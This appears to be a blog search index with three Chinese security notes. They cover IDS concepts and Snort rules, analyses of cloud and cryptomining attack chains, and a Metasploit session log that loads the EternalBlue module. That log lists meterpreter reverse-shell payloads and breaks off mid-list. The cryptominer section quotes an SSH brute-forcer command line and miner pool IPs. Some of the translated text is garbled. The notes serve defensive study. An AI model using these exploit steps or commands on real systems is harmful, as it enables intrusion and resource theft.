<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>IDS 逻辑和规则</title>
      <link href="/josyaaa/2022/05/30/ids/"/>
      <url>/josyaaa/2022/05/30/ids/</url>
      
        <content type="html"><![CDATA[<p>入侵检测：可以是硬件或软件形式，用于收集和分析计算机或网络中各个区域的信息，以识别可能的安全入侵；安全入侵：未经授权绕过系统安全机制的行为，两者是有本质的区别，蓝队 and 红队 ，哈哈哈哈<br>入侵检测系统可以收集相关入侵信息，用于增强入侵防御系统的防护能力，在IDS抽象过程中存在入侵典型行为和授权用户的典型行为不同，但行为仍然有重叠部分。在设计入侵者行为时的权重定义，是个折中的艺术，but 理想情况下，IDS具有较高的检测率，即检测到攻击数与攻击总数的比率，同时最小化误报率，即错误分类数与正常使用总数的比率。</p><h1 id="IDS-逻辑组件："><a href="#IDS-逻辑组件：" class="headerlink" title="IDS 逻辑组件："></a>IDS 逻辑组件：</h1><ol><li>传感器负责收集数据</li><li>分析器负责从传感器接收输入，并进行解析</li><li>用户接口负责用户能够可视化化查询</li></ol><p>这是个IDS简单的逻辑，但是在实时网络与分布式状态下，这种情况会变成多端口&#x2F;多用户&#x2F;多接口…，产生高可用&#x2F;高并发….等等问题</p><h1 id="IDS-根据分析数据的来源和类型进行分类："><a href="#IDS-根据分析数据的来源和类型进行分类：" class="headerlink" title="IDS 根据分析数据的来源和类型进行分类："></a>IDS 根据分析数据的来源和类型进行分类：</h1><ol><li>HIDS 检测一台主机特征和该主机与可疑活动事件</li><li>NIDS 检测特定的网段或设备的流量并分析网络、传输、应用协议来识别可疑活动</li><li>DIDS 将 HIDS and NIDS 中的 data 传输到一个中央分析器中，以便能更好的识别和响应入侵活动</li></ol><p>上述都是外部入侵者的检测，<a href="https://www.computer.org/csdl/magazine/sp/2008/01/msp2008010009/13rRUwjGoEs">内部入侵者检测</a></p><p>入侵检测系统会出现 <a href="https://scholar.google.se/citations?user=Ccw9m-wAAAAJ&hl=en">基率谬误</a></p><h1 id="IDS-异常检测的方法："><a href="#IDS-异常检测的方法：" class="headerlink" title="IDS 异常检测的方法："></a>IDS 异常检测的方法：</h1><ol><li>异常检测，以固定时间内的置信度高低进行判断</li><li>特征或启发式检测，利用恶意数据&#x2F;攻击规则与当前行为对比，进行判断（只能识别有模式&#x2F;有规则的攻击）,这类方式经常用于反病毒等产品上面。需要化大量经历来实时识别和检查新的 malware ，以及创建特征，开发添加最有效的攻击工具和脚本</li></ol><p>只有异常检测能够判断出 0day attack，因为是用正常行为识别异常行为，异常检测的方法首先要有训练数据集，才能开始开发用户行为模型，这其实就是数据科学或者机器学习或者数据挖掘的内容，主要的区别有：</p><ol><li>统计其实就是线性模型或者时序模型分析观测行为</li><li>基于知识法使用专家系统，也就是关联规则来分类建模</li><li>机器学习使用数据挖掘行为自动确定合适的分类模型</li></ol><p><a href="https://space.bilibili.com/1567748478/">参考</a></p><h1 id="data-source-and-sensor"><a href="#data-source-and-sensor" class="headerlink" title="data source and sensor"></a>data source and sensor</h1><ol><li>系统调用踪迹，这就是进程调用的记录，LX 有用，但是 windows 的 DLL 会掩盖这些特殊的进程调用</li><li>日志记录</li><li>文件完整性校验和，</li><li>注册表访问</li></ol><p>windows 并没有使用基于异常HIDS，由于广泛使用动态链接库DLL造成，so 使用关键 DLL 函数调用踪迹作为数据源的新方法 与 linux 上面基于系统调用踪迹相当。0-day DLL 调用…函数可以高效检测 windows HIDS ；Tripwire 检查被监控主机上的重要文件的改变，使用密码学校验和检测被监控文件任何超越基准的改变</p><h1 id="DHIDS"><a href="#DHIDS" class="headerlink" title="DHIDS"></a>DHIDS</h1><ol><li>主机代理模块<br>审计采集模块作为后台进程运行在监测系统上</li><li>局域网检测代理模块<br>分析局域网流量并向中央管理器报告结果</li><li>中央管理器模块<br>从局域网监控器和主机代理进程接收报告并分析这些报告</li></ol><h1 id="NIDS"><a href="#NIDS" class="headerlink" title="NIDS"></a>NIDS</h1><p>NIDS 实时或接近实时地检查流量数据包，试图检测入侵模式，可以检测网络层、传输层、应用层协议的活动</p><ul><li>网络传感器的类型：内嵌式、被动式（有线、无线{WIDS ：wdos、会话劫持、AP假冒}）</li></ul><h1 id="入侵检测技术"><a href="#入侵检测技术" class="headerlink" title="入侵检测技术"></a>入侵检测技术</h1><ol><li>SPADE 数据异常检测引擎</li></ol><ul><li>特征检测类型</li></ul><ol><li><p>应用层侦察和攻击<br>DHCP、DNS、FTP、HTTP、IMAP、IRC、POP、RPC、SMB、SMTP、SNMP、TFTP 以及数据库协议、及时消息应用…</p></li><li><p>传输层侦察和攻击<br>TCP、UDP… :( 异常数据包碎片、易受攻击端口、TCP特定攻击</p></li><li><p>网络层侦察和攻击<br>IPv4、IPv6、ICMP、IGMP :( IP地址欺骗、非法IP头部值</p></li><li><p>意外应用程序服务<br>确定传输连接上的活动是否与预期的应用协议一致</p></li><li><p>策略违背<br>使用不适当的web站点、禁用的应用协议</p></li></ol><ul><li>异常检测类型</li></ul><ol><li><p>拒绝服务</p></li><li><p>扫描<br>应用层、传输层、网络层</p></li><li><p>蠕虫</p></li></ol><ul><li><p>状态协议分析<br>SPA 通过推断和追踪网络、传输、应用协议状态，but 具有高资源占用</p></li><li><p>分布式入侵检测方案</p></li></ul><ol><li>summary event 中间采集点</li><li>ddi event 分布式检测和推断</li><li>pep 策略实施点</li></ol><h1 id="入侵检测交换格式"><a href="#入侵检测交换格式" class="headerlink" title="入侵检测交换格式"></a>入侵检测交换格式</h1><ol><li>入侵检测消息交换要求 IDMEF</li><li>入侵检测消息交换格式</li><li>入侵检测交换协议 IDXP<br>IDXP 支持基于面向连接协议的相互授权、完整性、可信性</li></ol><ul><li>入侵检测消息交换方法所基于的模型要素：<br>数据源、传感器、分析器、管理员、管理器、操作员…</li></ul><h1 id="入侵检测系统组件"><a href="#入侵检测系统组件" class="headerlink" title="入侵检测系统组件"></a>入侵检测系统组件</h1><p>蜜罐的作用是为引诱潜在攻击者原理关键系统的设计，主要功能：</p><ol><li>转移攻击者对重要系统的访问</li><li>收集有关攻击者活动的信息</li><li>引诱攻击者在系统中国逗留足够长的时间，以便于管理员对攻击作出响应</li></ol><ul><li><p>低交互蜜罐<br>能够模拟特定 IT 服务或系统的软件包构成</p></li><li><p>高交互蜜罐<br>带有完整操作系统、服务以及应用程序的真实系统，被部署在攻击者能够访问的地方</p></li><li><p>蜂蜜文件<br>用真实且诱人的名字和可能的内容来模拟合法的文件，蜜蜂文件的适当产生、安置、监测是新领域</p></li></ul><h1 id="snort-规则"><a href="#snort-规则" class="headerlink" title="snort 规则"></a>snort 规则</h1><p>规则引擎元素：</p><ol><li>动作：   drop reject sdrop</li><li>协议 ： TCP UDP ICMP IP</li><li>源IP地址 ：数据包的源地址</li><li>源端口： 指定特定协议的源端口</li><li>方向：单向、双向</li><li>目的IP地址： 数据包的目的地</li><li>目的端口：指明目的端口</li></ol><p>类别规则：</p><ol><li>元数据：提供关于规则的信息</li><li>载荷：查找有关在和数据包中的数据</li><li>非载荷：查找非载荷数据</li><li>后检测：当规则匹配一个数据包后引发的特定规则</li></ol><h1 id="sigma-rules"><a href="#sigma-rules" class="headerlink" title="sigma rules"></a>sigma rules</h1><h1 id="yara-rules"><a href="#yara-rules" class="headerlink" title="yara rules"></a>yara rules</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>云基础设施攻击方式逻辑</title>
      <link href="/josyaaa/2022/05/29/cloud%20attack/"/>
      <url>/josyaaa/2022/05/29/cloud%20attack/</url>
      
        <content type="html"><![CDATA[<p>任何通过对云基础设施提供存储、计算、托管服务的场外服务平台的网络攻击都可以归结为云网络攻击，这可能包括利用 saas、iaas、pass、rassd等服务交付模型的服务平台的攻击。“信息收集(binaryedage and shodan)”</p><h1 id="cloud-computing-cyber-attacks"><a href="#cloud-computing-cyber-attacks" class="headerlink" title="cloud computing cyber attacks"></a>cloud computing cyber attacks</h1><ul><li>CSP and user：</li></ul><ol><li>配置错误，csp 提供不同层次的服务，主要是身份认证和权限控制</li><li>API 漏洞，csp 提供应用程序编程接口，允许其云计算服务进行交互工作，这些 API 包含大量文档… so API<br>的集成和配置中任何漏洞都可以攻击</li><li>恶意内部人员</li><li>远程协作</li></ol><ul><li>shell bot</li></ul><ol><li>暴力破解工具、辅助命令、控制方法以及在受感染的服务器上阻止其他加密矿工的附加功能</li><li>通过访问密钥获得访问权限</li></ol><h1 id="终端挖矿"><a href="#终端挖矿" class="headerlink" title="终端挖矿"></a>终端挖矿</h1><ul><li>cryptominer attack</li></ul><ol><li><p>一个名为的 shell 脚本tddwrt7s.sh下载到 &#x2F;dev&#x2F;shm 或 &#x2F;tmp。dota.tar.gz然后使用包含相同文件 ( ) 作为包含恶意软件有效负载的参数的七个不同 URL 执行 shell 脚本。该脚本随机选择其中一个 URL，然后下载有效负载，然后将其解压缩并执行。</p></li><li><p>该活动使用一系列脚本和可执行文件在目标系统上安装和持久化。第一个 shell 脚本（要么 要么initall）init2删除旧安装的恶意软件，然后运行脚本 init。这既安装了恶意软件组件，又通过逐步遍历一系列子文件夹（a、b、c）并覆盖 crontab 使它们在系统上持久存在。</p></li><li><p>CRYPTOMINER 杀手脚本,该恶意软件活动中更有趣的部分之一是它会检查系统上是否有其他加密矿工，如果有则阻止它们。如果它没有转身并在系统上安装自己的加密矿工，这通常被认为是一件好事。这是通过一个 272 行的 shell 脚本完成的，名为init0.</p></li><li><p>CRYPTOMINER 安装&#x2F;初始化,a加密矿工通过两个名为和的 shell 脚本进行初始化run。shell 脚本a创建一个名为upd并执行的新 shell 脚本，然后执行run. 然后该脚本分别运行名为andrun的 32 位或 64 位版本的加密矿工。还有一个名为的脚本用作终止开关。加密矿工连接到两个 MoneroHash IP（107.191.99.221 和 107.191.99.95）并开始挖矿</p></li></ol><ul><li>command and control</li></ul><ol><li><p>C2 安装&#x2F;初始化,命令和控制组件的初始化是通过也命名为a和的 shell 脚本完成的run。该脚本a创建名为sync执行的脚本run。这些脚本执行一个名为的打包 perl 脚本rsync和一个名为ps. perl 脚本rsync允许通过 IRC 进行命令和控制，并ps允许来自恶意基础设施的 SSH 连接，并将用户锁定在系统之外。还有一个名为stop.</p></li><li><p>C2 总结,命令和控制组件由文件rsync和ps. 该文件rsync是一个打包的 perl 脚本，它连接到充当 C2 基础设施的恶意 IRC 服务器。它允许预先配置的命令和直接的 shell 访问。文件 ps 可能用于通过删除受感染用户的.ssh文件夹并创建自己的文件夹来建立另一种持久性机制。</p></li></ol><ul><li>ssh</li></ul><ol><li><p>SSH 暴力破解器，与它的同胞一样，它依赖于一系列 shell 脚本来初始化。shell 脚本start由 init 脚本之一运行；然后它创建一个名为的新 shell 脚本aptitude，该脚本运行名为run. 然后run执行一个名为go.</p></li><li><p>shell 脚本go下载一个包含 IP 地址的文件，该文件名为xtr. 然后从文件中指定的 IP 下载IP 和密码列表（分别命名a和命名） 。这些文件被重命名为，然后传递给名为. 此命令启动暴力破解程序，该程序运行一段设定的时间，然后重新启动。较新的变体设置为运行 24 小时而不是 90 分钟</p></li></ol><blockquote><p>timeout 90m .&#x2F;tsm -t $threads -f 0 -s 10 -S 10 -p 0 p ip</p></blockquote><h1 id="容器挖矿"><a href="#容器挖矿" class="headerlink" title="容器挖矿"></a>容器挖矿</h1><p>容器是管理应用程序开发-部署生命周期的有用工具，但它们不是安全工具。 Docker 建立在主机操作系统的低级特性之上，这些特性定义了哪些进程可以互相看到，以及它们各自可以访问哪些计算资源。但是容器仍然在底层共享主机资源，而更高的堆栈复杂性可能来自操作员（或潜在的不良行为者）用于在运行时启动容器的权限和配置参数。<br>就像采用任何新工具一样，这是解决安全问题和快速行动之间的平衡行为。 Threat Stack Cloud Security Platform® 提供高保真安全信号，用于观察操作员在您的环境中运行的基础架构上的行为——来自主机服务器、容器、编排及其管理控制平面。除了我们的客户入职流程外，我们还以 Threat Stack Cloud SecOps ProgramSM 的形式提供持续服务，我们的安全运营中心 (SOC) 的分析师在该计划中代表客户对警报进行分类并调查安全事件。<br>威胁堆栈 SOC 为我们提供了对该领域趋势攻击的独特视角。我们越来越多地看到一个趋势是围绕加密劫持，并在下面的一组匿名对抗行为中进行了概述。</p><ol><li>识别易受远程代码注入攻击的网站<br>该命令通过应用程序层发送，通常通过操纵网站上的文本字段或网站 URL 中公开的 API 端点来发送恶意代码，或者通过探测代码参考网站上常见的嵌入式 shell 控制台来发送恶意代码。注入的代码过滤到操作系统，并在后端转换到容器环境。</li><li>启动容器，注入的代码在其中运行<br>后端启动容器并准备执行注入的代码。在 Threat Stack SOC 分析师观察到的最新趋势中，攻击者随后将命令直接传递到 Docker 容器内的 shell。虽然仅限于容器对主机操作系统的简化视图，但攻击者现在可以任意运行不受信任的代码</li><li>将加密货币可执行文件下载到本地文件系统<br>以下一系列事件都在几秒钟内发生，并由我们的 SOC 中的分析师近乎实时地监控。这些事务的速度表明脚本攻击与手动键盘方法相比。第一步是运行 wget 命令来下载加密挖矿可执行文件 CNRig。</li><li>修改权限，chmod +x<br>在这里，攻击者更改了 CNRig 可执行文件的权限，无需额外身份验证即可运行此文件。在通常设计为在微服务架构中作为不可变组件运行的容器中，此事件是一个强烈的信号，表明出现了问题，并且是威胁堆栈中警报的良好候选者。</li><li>在这种情况下，可执行文件用完了 &#x2F;tmp 目录。默认情况下，此行为将在威胁堆栈中触发警报，默认情况下从 &#x2F;tmp 中查找任何进程活动。恶意软件倾向于在 strsadHitioonasl Ltisnux 设置中运行，通常授予所有用户下载和执行的权限是活动 wouSldOtCrigagnearlTyhsrtesantoStitaficekd 客户。&#x2F;tmp 中的文件。但是，根据用例，客户在生产中运行 Docker 可能希望确保它们锁定 &#x2F;tmp 因为它们会危害网络中的其他主机。</li><li>CNrig 尝试出站网络连接 S3 或 RDS 等托管服务。所以每次之后新主机在网络上受到威胁，该过程尝试建立三个连接：两次尝试返回攻击者的加密矿池，参与者将检查其权限。和一个可能的 CDN。连接尝试没有重复，导致 SOC 分析师得出结论：由于网络层其他地方的保护措施（例如数据包过滤和防火墙。第4步客户通常会在 Threat Stack 之外部署网络防御措施来阻止此类活动。但是没有容器中运行的进程的上下文，以及操作系统中的用户行为登陆具有足够权限的主机在攻击进行时被捕获，因此可能需要数小时甚至数天的时间来探索日志、关联并从 RDS 中提取数据行为，并找出根本原因。在这些步骤中描述的研究确定了正在发生的事情之后，SOC 团队提醒客户。一旦在具有所需 IAM 权限的主机上</li></ol><h1 id="cloud-attack-pulic"><a href="#cloud-attack-pulic" class="headerlink" title="cloud attack pulic"></a>cloud attack pulic</h1><ol><li><p>在这种性质的攻击中，许多不良行为者采取的第一步是利用被盗的 API 密钥。被盗密钥是首选，因为它们的使用看起来是合法的，而且经常未被发现。为了获取这些密钥，攻击者使用了多种方法，包括使用恶意软件从员工笔记本电脑中窃取密钥，或者从 GitHub 等开源代码网站进行耕作，员工不小心上传了他们的 API 密钥。一旦参与者确认 API 密钥有效，他们希望确保他们可以重新获得访问权限，即使安全或运营中的某人终止了他们被盗的访问密钥。为此，他们可以创建新的密钥、IAM 角色，或使用另一种方法来创建持久化方法。</p></li><li><p>检查权限并尝试持续<br>一旦参与者通过基础设施 API 成功进入环境，他们就会查看自己是否可以直接访问所需的资源，例如 RDS 数据库或 S3 存储桶。除了尝试访问 S3 数据外，攻击者还将尝试启动一个 EC2 实例，以便它们可以在网络本身上持续存在。</p></li><li><p>利用不安全配置的 EC2<br>当他们发现他们无法直接访问 RDS 数据库或 S3 存储桶时，他们开始利用他们的 EC2 访问权限。在这种情况下，参与者在环境中启动 EC2 实例。由于环境中的安全组配置不佳，这些主机与其网络上的任何其他合法主机一样受信任。许多组织信任其网络边界内的所有流量，因此这使攻击者能够考虑横向移动。</p></li><li><p>登录到 EC2<br>在他们使用不安全的 IAM 角色策略识别或启动 EC2 实例后，他们会登录。攻击者现在已经在环境的网络中建立了一个滩头阵地，允许他们侦察和扫描他们已经破坏的网络。</p></li><li><p>横向移动跨主机<br>攻击者继续从这个初始的恶意 EC2 实例横向移动，扫描并利用它们危害网络中的其他主机。EC2 实例在启动时被授予 IAM 权限，这在某些情况下可以让它们合法访问 AWS 托管服务，如 S3 或 RDS。</p></li><li><p>登陆主机足够的权限并从 RDS 中提取数据，一旦参与者登陆具有必要 IAM 权限或主机上的数据库凭证的主机，参与者就可以执行必要的 RDS API 调用（或 SQL 命令）以使用目标数据访问数据库。从这里，他们可以直接通过终端或通过他们的受感染主机链将其泄露，以避免数据丢失防护工具。</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>forget a msfconsole using</title>
      <link href="/josyaaa/2022/05/22/eternalbule/"/>
      <url>/josyaaa/2022/05/22/eternalbule/</url>
      
        <content type="html"><![CDATA[<p>(㉿172)-[~]<br>└─$ msfconsole  </p><pre><code>  .:okOOOkdc&#39;           &#39;cdkOOOko:..xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.</code></pre><p>   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:<br>  ‘OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO’<br>  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo<br>  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx<br>  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl<br>  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.<br>   cOOOOOOO.MMM.OOc.MMMMM’oOO.MMM,OOOOOOOc<br>    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo<br>     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl<br>      ;OOOO’MMM.OOOO.MMM:OOOO.MMM;OOOO;<br>       .dOOo’WM.OOOOocccxOOOO.MX’xOOd.<br>         ,kOl’M.OOOOOOOOOOOOO.M’dOk,<br>           :kk;.OOOOOOOOOOOOO.;Ok:<br>             ;kOOOOOOOOOOOOOOOk:<br>               ,xOOOOOOOOOOOx,<br>                 .lOOOOOOOl.<br>                    ,dOd,<br>                      .                                       </p><pre><code>   =[ metasploit v6.1.31-dev                          ]</code></pre><ul><li>– –&#x3D;[ 2201 exploits - 1166 auxiliary - 395 post       ]</li><li>– –&#x3D;[ 600 payloads - 45 encoders - 11 nops            ]</li><li>– –&#x3D;[ 9 evasion                                       ]</li></ul><p>Metasploit tip: View all productivity tips with the<br>tips command</p><p>msf6 &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue<br>[*] No payload configured, defaulting to windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; info</p><pre><code>   Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption Module: exploit/windows/smb/ms17_010_eternalblue</code></pre><p>   Platform: Windows<br>       Arch: x64<br> Privileged: Yes<br>    License: Metasploit Framework License (BSD)<br>       Rank: Average<br>  Disclosed: 2017-03-14</p><p>Provided by:<br>  Equation Group<br>  Shadow Brokers<br>  sleepya<br>  Sean Dillon <a href="mailto:&#x73;&#x65;&#97;&#110;&#46;&#100;&#105;&#108;&#108;&#111;&#110;&#x40;&#x72;&#x69;&#115;&#x6b;&#115;&#x65;&#x6e;&#115;&#101;&#x2e;&#x63;&#x6f;&#109;">&#x73;&#x65;&#97;&#110;&#46;&#100;&#105;&#108;&#108;&#111;&#110;&#x40;&#x72;&#x69;&#115;&#x6b;&#115;&#x65;&#x6e;&#115;&#101;&#x2e;&#x63;&#x6f;&#109;</a><br>  Dylan Davis <a href="mailto:&#x64;&#121;&#x6c;&#97;&#110;&#46;&#x64;&#x61;&#118;&#105;&#115;&#64;&#x72;&#x69;&#115;&#107;&#x73;&#101;&#x6e;&#x73;&#101;&#46;&#99;&#111;&#109;">&#x64;&#121;&#x6c;&#97;&#110;&#46;&#x64;&#x61;&#118;&#105;&#115;&#64;&#x72;&#x69;&#115;&#107;&#x73;&#101;&#x6e;&#x73;&#101;&#46;&#99;&#111;&#109;</a><br>  thelightcosine<br>  wvu <a href="mailto:&#x77;&#x76;&#x75;&#64;&#x6d;&#101;&#x74;&#x61;&#115;&#112;&#108;&#111;&#x69;&#x74;&#46;&#x63;&#x6f;&#x6d;">&#x77;&#x76;&#x75;&#64;&#x6d;&#101;&#x74;&#x61;&#115;&#112;&#108;&#111;&#x69;&#x74;&#46;&#x63;&#x6f;&#x6d;</a><br>  agalway-r7<br>  cdelafuente-r7<br>  cdelafuente-r7<br>  agalway-r7</p><p>Available targets:<br>  Id  Name</p><hr><p>  0   Automatic Target<br>  1   Windows 7<br>  2   Windows Embedded Standard 7<br>  3   Windows Server 2008 R2<br>  4   Windows 8<br>  5   Windows 8.1<br>  6   Windows Server 2012<br>  7   Windows 10 Pro<br>  8   Windows 10 Enterprise Evaluation</p><p>Check supported:<br>  Yes</p><p>Basic options:<br>  Name           Current Setti  Required  Description<br>                 ng</p><hr><p>  RHOSTS                        yes       The target host(s)<br>                                          , see <a href="https://gith/">https://gith</a><br>                                          ub.com&#x2F;rapid7&#x2F;meta<br>                                          sploit-framework&#x2F;w<br>                                          iki&#x2F;Using-Metasplo<br>                                          it<br>  RPORT          445            yes       The target port (T<br>                                          CP)<br>  SMBDomain                     no        (Optional) The Win<br>                                          dows domain to use<br>                                           for authenticatio<br>                                          n. Only affects Wi<br>                                          ndows Server 2008<br>                                          R2, Windows 7, Win<br>                                          dows Embedded Stan<br>                                          dard 7 target mach<br>                                          ines.<br>  SMBPass                       no        (Optional) The pas<br>                                          sword for the spec<br>                                          ified username<br>  SMBUser                       no        (Optional) The use<br>                                          rname to authentic<br>                                          ate as<br>  VERIFY_ARCH    true           yes       Check if remote ar<br>                                          chitecture matches<br>                                           exploit Target. O<br>                                          nly affects Window<br>                                          s Server 2008 R2,<br>                                          Windows 7, Windows<br>                                           Embedded Standard<br>                                           7 target machines<br>                                          .<br>  VERIFY_TARGET  true           yes       Check if remote OS<br>                                           matches exploit T<br>                                          arget. Only affect<br>                                          s Windows Server 2<br>                                          008 R2, Windows 7,<br>                                           Windows Embedded<br>                                          Standard 7 target<br>                                          machines.</p><p>Payload information:<br>  Space: 2000</p><p>Description:<br>  This module is a port of the Equation Group ETERNALBLUE exploit,<br>  part of the FuzzBunch toolkit released by Shadow Brokers. There is a<br>  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is<br>  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error<br>  where a DWORD is subtracted into a WORD. The kernel pool is groomed<br>  so that overflow is well laid-out to overwrite an SMBv1 buffer.<br>  Actual RIP hijack is later completed in<br>  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may<br>  not trigger 100% of the time, and should be run continuously until<br>  triggered. It seems like the pool will get hot streaks and need a<br>  cool down period before the shells rain in again. The module will<br>  attempt to use Anonymous login, by default, to authenticate to<br>  perform the exploit. If the user supplies credentials in the<br>  SMBUser, SMBPass, and SMBDomain options it will use those instead.<br>  On some systems, this module may cause system instability and<br>  crashes, such as a BSOD or a reboot. This may be more likely with<br>  some payloads.</p><p>References:<br>  <a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010">https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010</a><br>  <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0143">https://nvd.nist.gov/vuln/detail/CVE-2017-0143</a><br>  <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0144">https://nvd.nist.gov/vuln/detail/CVE-2017-0144</a><br>  <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0145">https://nvd.nist.gov/vuln/detail/CVE-2017-0145</a><br>  <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0146">https://nvd.nist.gov/vuln/detail/CVE-2017-0146</a><br>  <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0147">https://nvd.nist.gov/vuln/detail/CVE-2017-0147</a><br>  <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0148">https://nvd.nist.gov/vuln/detail/CVE-2017-0148</a><br>  <a href="https://github.com/RiskSense-Ops/MS17-010">https://github.com/RiskSense-Ops/MS17-010</a><br>  <a href="https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf">https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf</a><br>  <a href="https://www.exploit-db.com/exploits/42030">https://www.exploit-db.com/exploits/42030</a></p><p>Also known as:<br>  ETERNALBLUE</p><p>msf6 exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; show payloads<br>Compatible Payloads<br>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><h1 id="Name-Disclosure-Date-Rank-Check-Description"><a href="#Name-Disclosure-Date-Rank-Check-Description" class="headerlink" title="Name                                                Disclosure Date  Rank    Check  Description"></a>Name                                                Disclosure Date  Rank    Check  Description</h1><hr><p>   0   payload&#x2F;generic&#x2F;custom                                               normal  No     Custom Payload<br>   1   payload&#x2F;generic&#x2F;shell_bind_tcp                                       normal  No     Generic Command Shell, Bind TCP Inline<br>   2   payload&#x2F;generic&#x2F;shell_reverse_tcp                                    normal  No     Generic Command Shell, Reverse TCP Inline<br>   3   payload&#x2F;generic&#x2F;ssh&#x2F;interact                                         normal  No     Interact with Established SSH Connection<br>   4   payload&#x2F;windows&#x2F;x64&#x2F;exec                                             normal  No     Windows x64 Execute Command<br>   5   payload&#x2F;windows&#x2F;x64&#x2F;loadlibrary                                      normal  No     Windows x64 LoadLibrary Path<br>   6   payload&#x2F;windows&#x2F;x64&#x2F;messagebox                                       normal  No     Windows MessageBox x64<br>   7   payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager<br>   8   payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support<br>   9   payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager<br>   10  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager<br>   11  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)<br>   12  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)<br>   13  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)<br>   14  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)<br>   15  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager<br>   16  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager<br>   17  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)<br>   18  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)<br>   19  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)<br>   20  payload&#x2F;windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)<br>   21  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;bind_ipv6_tcp                           normal  No     Windows Inject Reflective PE Files, Windows x64 IPv6 Bind TCP Stager<br>   22  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;bind_ipv6_tcp_uuid                      normal  No     Windows Inject Reflective PE Files, Windows x64 IPv6 Bind TCP Stager with UUID Support<br>   23  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;bind_named_pipe                         normal  No     Windows Inject Reflective PE Files, Windows x64 Bind Named Pipe Stager<br>   24  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;bind_tcp                                normal  No     Windows Inject Reflective PE Files, Windows x64 Bind TCP Stager<br>   25  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;bind_tcp_rc4                            normal  No     Windows Inject Reflective PE Files, Bind TCP Stager (RC4 Stage Encryption, Metasm)<br>   26  payload&#x2F;windows&#x2F;x64&#x2F;peinject&#x2F;bind_tcp_uuid                           normal  No     Windows Inject Reflective PE Files, Bind TCP Stager with UUID Support (Windows 